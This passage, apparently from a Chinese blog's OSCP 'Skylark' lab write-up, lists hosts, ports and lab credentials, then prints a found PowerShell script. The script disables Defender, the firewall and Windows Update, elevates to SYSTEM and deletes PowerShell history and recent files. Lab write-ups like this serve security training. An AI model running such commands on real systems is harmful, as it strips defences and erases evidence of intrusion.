@@ -1,0 +1,811 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>OSCP-Skylark | CXAQHQ</title>
+<link rel="shortcut icon" href="https://blog.cxaqhq.cn/favicon.ico?v=1744037624894">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://blog.cxaqhq.cn/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="OSCP-Skylark | CXAQHQ - Atom Feed" href="https://blog.cxaqhq.cn/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="网络拓扑图
+
+192
+
+192.168.239.250
+
+135
+139
+445
+3389
+
+
+192.168.239.220
+
+80  401认证
+135
+139
+445
+5900
+
+
+192.168.239.221
+
+80   IIS默..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://blog.cxaqhq.cn">
+  <img class="avatar" src="https://blog.cxaqhq.cn/images/avatar.png?v=1744037624894" alt="">
+  </a>
+  <h1 class="site-title">
+    CXAQHQ
+  </h1>
+  <p class="site-description">
+    再努力一点！
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/badboycxcc" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/cxaqhq" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              OSCP-Skylark
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-09-12
+              </span>
+              <span>
+                23 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="网络拓扑图">网络拓扑图</h2>
+<figure data-type="image" tabindex="1"><img src="https://blog.cxaqhq.cn/post-images/1694520590638.png" alt="" loading="lazy"></figure>
+<h3 id="192">192</h3>
+<ul>
+<li>192.168.239.250
+<ul>
+<li>135</li>
+<li>139</li>
+<li>445</li>
+<li>3389</li>
+</ul>
+</li>
+<li>192.168.239.220
+<ul>
+<li>80  401认证</li>
+<li>135</li>
+<li>139</li>
+<li>445</li>
+<li>5900</li>
+</ul>
+</li>
+<li>192.168.239.221
+<ul>
+<li>80   IIS默认页面</li>
+<li>135</li>
+<li>139</li>
+<li>443   IIS默认页面</li>
+<li>445</li>
+</ul>
+</li>
+<li>192.168.239.222
+<ul>
+<li>135</li>
+<li>139</li>
+<li>445</li>
+</ul>
+</li>
+<li>192.168.239.223
+<ul>
+<li>60001</li>
+</ul>
+</li>
+<li>192.168.239.224
+<ul>
+<li>22</li>
+</ul>
+</li>
+<li>192.168.239.225（Pwn）（SKYLARK\kiosk      XEwUS^9R2Gwt8O914）
+<ul>
+<li>21</li>
+<li>80   Nginx默认页面</li>
+<li>8090 403</li>
+</ul>
+</li>
+<li>192.168.239.226
+<ul>
+<li>135</li>
+<li>139</li>
+<li>445</li>
+</ul>
+</li>
+<li>192.168.239.227
+<ul>
+<li>80</li>
+<li>3389</li>
+</ul>
+</li>
+</ul>
+<h3 id="172">172</h3>
+<ul>
+<li>172.16.169.32</li>
+<li>172.16.169.30</li>
+<li>172.16.169.31</li>
+</ul>
+<h3 id="10">10</h3>
+<ul>
+<li>10.10.129.11</li>
+<li>10.20.129.111</li>
+<li>10.20.129.110</li>
+<li>10.20.129.15</li>
+<li>10.20.129.14</li>
+<li>10.10.129.13</li>
+<li>10.10.129.12</li>
+<li>10.10.129.10</li>
+<li>10.10.129.250</li>
+</ul>
+<h3 id="250">250</h3>
+<p>已给出系统凭证 offsec/lab，根据端口扫描结果，直接RDP登陆<br>
+查看权限发现offsec 属于Administrator 组</p>
+<pre><code>C:\Users\offsec\Downloads&gt;ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 192.168.231.250
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.231.254
+
+C:\Users\offsec\Downloads&gt;net user offsec
+net user offsec
+User name                    offsec
+Full Name                    
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            9/26/2022 6:02:00 PM
+Password expires             Never
+Password changeable          9/26/2022 6:02:00 PM
+Password required            No
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   9/13/2023 5:54:20 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       
+Global Group memberships     *None                 
+The command completed successfully.
+</code></pre>
+<p>C:\Users\offsec\Downloads 发现gp.ps1 脚本，内容都是注册表操作相关，功能不确定</p>
+<pre><code>type gp.ps1
+#Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
+
+Write-Host @&quot;
+                                                                                                                      
+        GGGGGGGGGGGGGPPPPPPPPPPPPPPPPP        OOOOOOOOO     
+     GGG::::::::::::GP::::::::::::::::P     OO:::::::::OO   
+   GG:::::::::::::::GP::::::PPPPPP:::::P  OO:::::::::::::OO 
+  G:::::GGGGGGGG::::GPP:::::P     P:::::PO:::::::OOO:::::::O
+ G:::::G       GGGGGG  P::::P     P:::::PO::::::O   O::::::O
+G:::::G                P::::P     P:::::PO:::::O     O:::::O
+G:::::G                P::::PPPPPP:::::P O:::::O     O:::::O
+G:::::G    GGGGGGGGGG  P:::::::::::::PP  O:::::O     O:::::O
+G:::::G    G::::::::G  P::::PPPPPPPPP    O:::::O     O:::::O
+G:::::G    GGGGG::::G  P::::P            O:::::O     O:::::O
+G:::::G        G::::G  P::::P            O:::::O     O:::::O
+ G:::::G       G::::G  P::::P            O::::::O   O::::::O
+  G:::::GGGGGGGG::::GPP::::::PP          O:::::::OOO:::::::O
+   GG:::::::::::::::GP::::::::P           OO:::::::::::::OO 
+     GGG::::::GGG:::GP::::::::P             OO:::::::::OO   
+        GGGGGG   GGGGPPPPPPPPPP               OOOOOOOOO     
+                                                            
+&quot;@
+Write-Host &quot;[+] Disabling IPv6&quot;
+Disable-NetAdapterBinding -Name &quot;*&quot; -ComponentID ms_tcpip6
+
+Write-Host &quot;[+] Disabling Sleep Mode&quot;
+powercfg /Change monitor-timeout-ac 0
+powercfg /Change monitor-timeout-dc 0
+powercfg /Change standby-timeout-ac 0
+powercfg /Change standby-timeout-dc 0
+powercfg /Change hibernate-timeout-ac 0
+powercfg /Change hibernate-timeout-dc 0
+
+Write-Host &quot;[+] Disabling Windows Media Volume&quot;
+Get-PnpDevice -class &quot;MEDIA&quot; | ForEach-Object {Disable-PnpDevice -InstanceId $_.InstanceID -Confirm:$false}
+
+Write-Output &quot;[+] Disabling Start Menu and Taskbar features&quot;
+REG add &quot;HKCU\Software\Policies\Microsoft\Windows\Explorer\&quot; /v NoPinningStoreToTaskbar /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Policies\Microsoft\Windows\Explorer\&quot; /v NoPinningStoreToTaskbar
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot; /v NoTrayItemsDisplay /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot; /v NoTrayItemsDisplay
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot; /v LockTaskbar /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot; /v LockTaskbar
+REG add &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\&quot; /v HidePowerOptions /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\&quot; /v HidePowerOptions
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot; /v NoSimpleStartMenu /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot; /v NoSimpleStartMenu
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot; /v TaskbarNoRedock /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot; /v TaskbarNoRedock
+REG add &quot;HKCU\Software\Policies\Microsoft\Windows\Explorer&quot; /v NoUninstallFromStart /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Policies\Microsoft\Windows\Explorer&quot; /v NoUninstallFromStart
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot; /v TaskbarLockAll /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot; /v TaskbarLockAll
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot; /v TaskbarNoAddRemoveToolbar /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot; /v TaskbarNoAddRemoveToolbar
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot; /v NoChangeStartMenu /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot; /v NoChangeStartMenu
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot; /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot; /v NoStartMenuMyMusic
+REG add &quot;HKLM\Software\Policies\Microsoft\Windows\Explorer&quot; /v StartMenuLayoutFile /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKLM\Software\Policies\Microsoft\Windows\Explorer&quot; /v StartMenuLayoutFile
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Feeds&quot; /v ShellFeedsTaskbarViewMode /t REG_DWORD /d 2 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Feeds&quot; /v ShellFeedsTaskbarViewMode
+REG add &quot;HKLM\Software\Policies\Microsoft\Windows\GameDV&quot; /v AllowGameDVR /t REG_DWORD /d 0 /f
+REG QUERY &quot;HKLM\Software\Policies\Microsoft\Windows\GameDV&quot; /v AllowGameDVR 
+REG add &quot;HKLM\Software\Policies\Microsoft\Windows\System&quot; /v DisableLockScreenAppNotifications /t REG_DWORD /d 0 /f
+REG QUERY &quot;HKLM\Software\Policies\Microsoft\Windows\System&quot; /v DisableLockScreenAppNotifications
+
+
+#Write-Host &quot;[+] Switching to Dark Mode&quot;
+#Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize -Name AppsUseLightTheme -Value 0
+
+Write-Output &quot;[+] Removing Windows Application bloatware&quot;
+Get-AppxPackage -AllUsers | Remove-AppxPackage
+New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\' -Name 'Windows Search' | Out-Null
+New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search' -Name 'AllowCortana' -PropertyType DWORD -Value '0' | Out-Null
+
+Write-Host &quot;[+] Stopping and Removing OneDrive&quot;
+ps onedrive | Stop-Process -Force
+start-process &quot;$env:windir\SysWOW64\OneDriveSetup.exe&quot; &quot;/uninstall&quot;
+
+Write-Host &quot;[+] Disabling Action Center&quot;
+ If (!(Test-Path &quot;HKCU:\Software\Policies\Microsoft\Windows\Explorer&quot;)) {
+ New-Item -Path &quot;HKCU:\Software\Policies\Microsoft\Windows\Explorer&quot; | Out-Null
+ }
+ Set-ItemProperty -Path &quot;HKCU:\Software\Policies\Microsoft\Windows\Explorer&quot; -Name &quot;DisableNotificationCenter&quot; -Type DWord -Value 1
+ Set-ItemProperty -Path &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications&quot; -Name &quot;ToastEnabled&quot; -Type DWord -Value 0
+
+Write-Output &quot;[+] Unpin Tiles&quot;
+#Requires -RunAsAdministrator
+
+$START_MENU_LAYOUT = @&quot;
+&lt;LayoutModificationTemplate xmlns:defaultlayout=&quot;http://schemas.microsoft.com/Start/2014/FullDefaultLayout&quot; xmlns:start=&quot;http://schemas.microsoft.com/Start/2014/StartLayout&quot; Version=&quot;1&quot; xmlns:taskbar=&quot;http://schemas.microsoft.com/Start/2014/TaskbarLayout&quot; xmlns=&quot;http://schemas.microsoft.com/Start/2014/LayoutModification&quot;&gt;
+    &lt;LayoutOptions StartTileGroupCellWidth=&quot;6&quot; /&gt;
+    &lt;DefaultLayoutOverride&gt;
+        &lt;StartLayoutCollection&gt;
+            &lt;defaultlayout:StartLayout GroupCellWidth=&quot;6&quot; /&gt;
+        &lt;/StartLayoutCollection&gt;
+    &lt;/DefaultLayoutOverride&gt;
+&lt;/LayoutModificationTemplate&gt;
+&quot;@
+
+$layoutFile=&quot;C:\Windows\StartMenuLayout.xml&quot;
+
+#Delete layout file if it already exists
+If(Test-Path $layoutFile)
+{
+    Remove-Item $layoutFile
+}
+
+#Creates the blank layout file
+$START_MENU_LAYOUT | Out-File $layoutFile -Encoding ASCII
+
+$regAliases = @(&quot;HKLM&quot;, &quot;HKCU&quot;)
+
+#Assign the start layout and force it to apply with &quot;LockedStartLayout&quot; at both the machine and user level
+foreach ($regAlias in $regAliases){
+    $basePath = $regAlias + &quot;:\SOFTWARE\Policies\Microsoft\Windows&quot;
+    $keyPath = $basePath + &quot;\Explorer&quot; 
+    IF(!(Test-Path -Path $keyPath)) { 
+        New-Item -Path $basePath -Name &quot;Explorer&quot;
+    }
+    Set-ItemProperty -Path $keyPath -Name &quot;LockedStartLayout&quot; -Value 1
+    Set-ItemProperty -Path $keyPath -Name &quot;StartLayoutFile&quot; -Value $layoutFile
+}
+
+#Restart Explorer, open the start menu (necessary to load the new layout), and give it a few seconds to process
+Stop-Process -name explorer
+Start-Sleep -s 5
+$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESCAPE}')
+Start-Sleep -s 5
+
+#Enable the ability to pin items again by disabling &quot;LockedStartLayout&quot;
+foreach ($regAlias in $regAliases){
+    $basePath = $regAlias + &quot;:\SOFTWARE\Policies\Microsoft\Windows&quot;
+    $keyPath = $basePath + &quot;\Explorer&quot; 
+    Set-ItemProperty -Path $keyPath -Name &quot;LockedStartLayout&quot; -Value 0
+}
+
+#Restart Explorer and delete the layout file
+Stop-Process -name explorer
+
+# Uncomment the next line to make clean start menu default for all new users
+#Import-StartLayout -LayoutPath $layoutFile -MountPath $env:SystemDrive\
+
+Remove-Item $layoutFile
+
+Write-Host &quot;[+] Removing Defender&quot;
+if(-Not $($(whoami) -eq &quot;nt authority\system&quot;)) {
+    $IsSystem = $false
+
+    # Elevate to admin (needed when called after reboot)
+    if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
+        Write-Host &quot;    [i] Elevate to Administrator&quot;
+        $CommandLine = &quot;-ExecutionPolicy Bypass `&quot;&quot; + $MyInvocation.MyCommand.Path + &quot;`&quot; &quot; + $MyInvocation.UnboundArguments
+        Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
+        Exit
+    }
+
+    # Elevate to SYSTEM if psexec is available
+    $psexec_path = $(Get-Command PsExec -ErrorAction 'ignore').Source 
+    if($psexec_path) {
+        Write-Host &quot;    [i] Elevate to SYSTEM&quot;
+        $CommandLine = &quot; -i -s powershell.exe -ExecutionPolicy Bypass `&quot;&quot; + $MyInvocation.MyCommand.Path + &quot;`&quot; &quot; + $MyInvocation.UnboundArguments 
+        Start-Process -WindowStyle Hidden -FilePath $psexec_path -ArgumentList $CommandLine
+        exit
+    } else {
+        Write-Host &quot;    [i] PsExec not found, will continue as Administrator&quot;
+    }
+
+} else {
+    $IsSystem = $true
+}
+
+
+Write-Host &quot;[+] Removing Defender&quot;
+67..90|foreach-object{
+    $drive = [char]$_
+    Add-MpPreference -ExclusionPath &quot;$($drive):\&quot; -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess &quot;$($drive):\*&quot; -ErrorAction SilentlyContinue
+}
+
+Write-Host &quot;    [+] Disable scanning engines (Set-MpPreference)&quot;
+Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue
+Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue
+Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue
+Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue
+Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue
+Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue
+Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue
+Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue
+Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue
+Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
+
+Write-Host &quot;    [+] Set default actions to Allow (Set-MpPreference)&quot;
+Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
+Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
+Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue
+
+
+Write-Host &quot;[+] Removing Defender&quot;
+$need_reboot = $false
+
+# WdNisSvc Network Inspection Service 
+# WinDefend Antivirus Service
+# Sense : Advanced Protection Service
+
+$svc_list = @(&quot;WdNisSvc&quot;, &quot;WinDefend&quot;, &quot;Sense&quot;)
+foreach($svc in $svc_list) {
+    if($(Test-Path &quot;HKLM:\SYSTEM\CurrentControlSet\Services\$svc&quot;)) {
+        if( $(Get-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Services\$svc&quot;).Start -eq 4) {
+            Write-Host &quot;        [i] Service $svc already disabled&quot;
+        } else {
+            Write-Host &quot;        [i] Disable service $svc (next reboot)&quot;
+            Set-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Services\$svc&quot; -Name Start -Value 4
+            $need_reboot = $true
+        }
+    } else {
+        Write-Host &quot;        [i] Service $svc already deleted&quot;
+    }
+}
+
+Write-Host &quot;    [+] Disable drivers&quot;
+
+# WdnisDrv : Network Inspection System Driver
+# wdfilter : Mini-Filter Driver
+# wdboot : Boot Driver
+
+$drv_list = @(&quot;WdnisDrv&quot;, &quot;wdfilter&quot;, &quot;wdboot&quot;)
+foreach($drv in $drv_list) {
+    if($(Test-Path &quot;HKLM:\SYSTEM\CurrentControlSet\Services\$drv&quot;)) {
+        if( $(Get-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Services\$drv&quot;).Start -eq 4) {
+            Write-Host &quot;        [i] Driver $drv already disabled&quot;
+        } else {
+            Write-Host &quot;        [i] Disable driver $drv (next reboot)&quot;
+            Set-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Services\$drv&quot; -Name Start -Value 4
+            $need_reboot = $true
+        }
+    } else {
+        Write-Host &quot;        [i] Driver $drv already deleted&quot;
+    }
+}
+
+# Check if service running or not
+if($(GET-Service -Name WinDefend).Status -eq &quot;Running&quot;) {   
+    Write-Host &quot;    [+] WinDefend Service still running (reboot required)&quot;
+    $need_reboot = $true
+} else {
+    Write-Host &quot;    [+] WinDefend Service not running&quot;
+}
+
+
+Write-Host &quot;[+] Disabling Windows Update&quot;
+    Clear-Host
+
+    $WindowsUpdatePath = &quot;HKLM:SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\&quot;
+    $AutoUpdatePath = &quot;HKLM:SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU&quot;
+
+    If(Test-Path -Path $WindowsUpdatePath) {
+        Remove-Item -Path $WindowsUpdatePath -Recurse
+    }
+
+    New-Item $WindowsUpdatePath -Force
+    New-Item $AutoUpdatePath -Force
+
+    Set-ItemProperty -Path $AutoUpdatePath -Name NoAutoUpdate -Value 1
+
+    Get-ScheduledTask -TaskPath &quot;\Microsoft\Windows\WindowsUpdate\&quot; | Disable-ScheduledTask
+
+    takeown /F C:\Windows\System32\Tasks\Microsoft\Windows\UpdateOrchestrator /A /R
+    icacls C:\Windows\System32\Tasks\Microsoft\Windows\UpdateOrchestrator /grant Administrators:F /T
+
+    Get-ScheduledTask -TaskPath &quot;\Microsoft\Windows\UpdateOrchestrator\&quot; | Disable-ScheduledTask
+
+    Stop-Service wuauserv
+    Set-Service wuauserv -StartupType Disabled
+
+    # We disable WindowsUpdate folder again, because wuauserv service could have enabled it meanwhile
+    Get-ScheduledTask -TaskPath &quot;\Microsoft\Windows\WindowsUpdate\&quot; | Disable-ScheduledTask
+
+    Write-Output &quot;All Windows Updates were disabled&quot;
+
+Write-Host &quot;[+] Emptying the bin&quot;
+echo Y|PowerShell.exe -NoProfile -Command Clear-RecycleBin
+
+Write-Output &quot;[+] Disabling File History and Notifications&quot;
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\&quot; /v ClearRecentDocsOnExit /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\&quot; /v ClearRecentDocsOnExit
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\&quot; /v NoRecentDocsHistory /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\&quot; /v NoRecentDocsHistory
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\&quot; /v HideRecentlyAddedApps /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\&quot; /v HideRecentlyAddedApps
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\&quot; /v NoSMMyPictures /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\&quot; /v NoSMMyPictures
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\&quot; /v NoRecentDocsMenu /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\&quot; /v NoRecentDocsMenu
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\&quot; /v DisableNotificationCenter /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\&quot; /v DisableNotificationCenter
+
+Write-Output &quot;[+] Turn Off Location and Sensors&quot;
+REG add &quot;HKLM\Software\Policies\Microsoft\Windows\LocationAndSensors\&quot; /v DisableLocation /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKLM\Software\Policies\Microsoft\Windows\LocationAndSensors\&quot; /v DisableLocation
+REG add &quot;HKCU\Software\Policies\Microsoft\Windows\LocationAndSensors\&quot; /v DisableLocation /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Policies\Microsoft\Windows\LocationAndSensors\&quot; /v DisableLocation
+REG add &quot;HKLM\Software\Policies\Microsoft\Windows\LocationAndSensors\&quot; /v DisableLocationScripting /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKLM\Software\Policies\Microsoft\Windows\LocationAndSensors\&quot; /v DisableLocationScripting
+REG add &quot;HKCU\Software\Policies\Microsoft\Windows\LocationAndSensors\&quot; /v DisableLocationScripting /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Policies\Microsoft\Windows\LocationAndSensors\&quot; /v DisableLocationScripting
+REG add &quot;HKLM\Software\Policies\Microsoft\Windows\LocationAndSensors\&quot; /v DisableSensors /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKLM\Software\Policies\Microsoft\Windows\LocationAndSensors\&quot; /v DisableSensors
+REG add &quot;HKCU\Software\Policies\Microsoft\Windows\LocationAndSensors\&quot; /v DisableSensors /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Policies\Microsoft\Windows\LocationAndSensors\&quot; /v DisableSensors
+REG add &quot;HKLM\Software\Policies\Microsoft\Windows\LocationAndSensors\&quot; /v DisableWindowsLocationProvider /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKLM\Software\Policies\Microsoft\Windows\LocationAndSensors\&quot; /v DisableWindowsLocationProvider
+
+Write-Output &quot;[+] Disabling Desktop Changes&quot;
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop\&quot; /v NoChangingWallPaper /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop\&quot; /v NoChangingWallPaper
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\&quot; /v NoDispAppearancePage /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\&quot; /v NoDispAppearancePage
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\&quot; /v NoDispBackgroundPage /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\&quot; /v NoDispBackgroundPage
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\&quot; /v NoCloseDragDropBands /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\&quot; /v NoCloseDragDropBands
+REG add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\&quot; /v NoActiveDesktopChanges /t REG_DWORD /d 1 /f
+REG QUERY &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\&quot; /v NoActiveDesktopChanges
+
+Write-Output &quot;[+] Disabling Local Password Expiration for all User Account&quot;
+wmic UserAccount set PasswordExpires=False
+
+Write-Host &quot;[+ Disabling Removalble Storage Access&quot;
+Set-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Services\USBSTOR\&quot; -Name &quot;start&quot; -Value 4
+
+Write-Host &quot;[+] Disabling News and Interest&quot;
+Reg Add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Feeds&quot; /T REG_DWORD /V &quot;EnableFeeds&quot; /D 0 /F
+REG QUERY &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Feeds&quot; /v EnableFeeds
+
+Write-Host &quot;[+] Removing Password Complexity Requirement&quot;
+secedit /export /cfg c:\secpol.cfg
+(gc C:\secpol.cfg).replace(&quot;PasswordComplexity = 1&quot;, &quot;PasswordComplexity = 0&quot;) | Out-File C:\secpol.cfg
+secedit /configure /db c:\windows\security\local.sdb /cfg c:\secpol.cfg /areas SECURITYPOLICY
+rm -force c:\secpol.cfg -confirm:$false
+
+Write-Host &quot;[+] Enabling Fastboot&quot;
+REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power&quot; /V HiberbootEnabled /T REG_dWORD /D 0 /F
+REG QUERY &quot;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power&quot; /v HiberbootEnabled
+
+Write-Host &quot;[+] Disabling Firewall&quot;
+netsh advfirewall set allprofiles state off
+
+Write-Host &quot;[+] Disabling Print Spooler Service&quot;
+Stop-Service -name Spooler -force
+Set-Service -name spooler -startupType disabled
+Get-Service -name spooler
+
+Write-Host &quot;[+] Disbling Internet Explorer&quot;
+Disable-WindowsOptionalFeature -FeatureName Internet-Explorer-Optional-amd64 -Online
+
+Write-Host &quot;[+] Cleaning Up&quot;
+Remove-Item &quot;C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\*&quot; -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item &quot;C:\Users\*\AppData\Local\Temp\*&quot; -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item &quot;C:\`$Recycle.Bin\*&quot; -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item &quot;C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&quot; -Force -ErrorAction SilentlyContinue
+
+Write-Output &quot;[+] Thank you for your Childhood, Live long and Prosper&quot;
+
+Write-Host
+Restart-Computer
+</code></pre>
+<p>文件检查发现一个特殊文件：C:\users\offsec.vscode\argv.json</p>
+<pre><code>// This configuration file allows you to pass permanent command line arguments to VS Code.
+// Only a subset of arguments is currently supported to reduce the likelihood of breaking
+// the installation.
+//
